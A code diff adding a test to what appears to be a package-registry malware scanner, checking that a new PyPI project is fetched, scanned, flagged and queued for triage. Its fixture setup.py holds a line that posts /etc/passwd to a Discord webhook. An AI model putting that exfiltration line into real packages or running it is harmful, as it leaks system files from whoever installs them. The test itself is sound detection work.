@@ -49,6 +49,42 @@ def test_open_vsx_release_is_downloaded_scanned_and_alerted(tmp_path):
     assert research_content_funnel.run(db_path=db_path, fetcher=fetcher, limit=10)["open-vsx"]["scanned"] == 0, "scanned releases are not rescanned"
 
 
+def test_new_pypi_project_is_scanned_at_its_latest_version(tmp_path):
+    import tarfile
+
+    db_path = str(tmp_path / "soc.db")
+    for package in ("evil-proj", "gone-proj"):
+        _seed(db_path, "pypi", package, "")
+    with soc_store.connect(db_path) as connection:
+        connection.execute("UPDATE registry_feed_events SET event_type='project_added'")
+    buffer = io.BytesIO()
+    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
+        data = b"import requests\nrequests.post('https://discord.com/api/webhooks/1/x', data=open('/etc/passwd').read())\n"
+        member = tarfile.TarInfo("evil-proj-1.2.0/setup.py")
+        member.size = len(data)
+        archive.addfile(member, io.BytesIO(data))
+    sdist = "https://files.pythonhosted.org/packages/evil-proj-1.2.0.tar.gz"
+    blobs = {
+        "https://pypi.org/pypi/evil-proj/json": json.dumps({"info": {"version": "1.2.0"}}).encode(),
+        "https://pypi.org/pypi/evil-proj/1.2.0/json": json.dumps({"urls": [{"url": sdist, "size": 500, "packagetype": "sdist", "filename": "evil-proj-1.2.0.tar.gz"}]}).encode(),
+        sdist: buffer.getvalue(),
+    }
+
+    def fetch(url, _max):
+        return (200, {"content-type": "application/octet-stream"}, blobs[url]) if url in blobs else (404, {}, b"")
+
+    stats = research_content_funnel.run(db_path=db_path, fetcher=SafeFetcher(fetch=fetch), limit=10)["pypi"]
+    assert (stats["scanned"], stats["hits"], stats["skipped"]) == (2, 1, 1)
+    with soc_store.connect(db_path) as connection:
+        states = dict(connection.execute("SELECT package, json_extract(metadata_json, '$.content_prescan.status') FROM registry_feed_events").fetchall())
+        resolved = connection.execute("SELECT json_extract(metadata_json, '$.content_prescan.resolved_version') FROM registry_feed_events WHERE package='evil-proj'").fetchone()[0]
+        reason = connection.execute("SELECT reason FROM research_alerts").fetchone()[0]
+        queued = connection.execute("SELECT artifact_key FROM research_ai_triage").fetchone()[0]
+    assert states == {"evil-proj": "hit", "gone-proj": "skipped"} and resolved == "1.2.0"
+    assert "pypi:evil-proj@1.2.0" in reason and queued == "pypi:evil-proj@1.2.0"
+    assert research_content_funnel.run(db_path=db_path, fetcher=SafeFetcher(fetch=fetch), limit=10)["pypi"]["scanned"] == 0, "scanned once"
+
+
 def test_crates_collector_walks_to_the_cursor(tmp_path, monkeypatch):
     from secopsai import research_surveillance as rs
 
